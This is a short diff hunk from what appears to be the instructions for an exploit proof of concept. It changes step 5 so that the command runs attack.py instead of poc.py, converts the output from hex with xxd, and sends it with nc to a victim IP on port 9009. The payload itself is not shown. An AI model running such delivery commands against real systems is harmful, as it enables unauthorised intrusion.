@@ -22,6 +22,6 @@ modify $VictimIP
 **5. Run attack.py** 
 
 ```
-$Python3 poc.py | xxd -r -p | nc $VictimIP 9009
+$Python3 attack.py | xxd -r -p | nc $VictimIP 9009
 ```
 
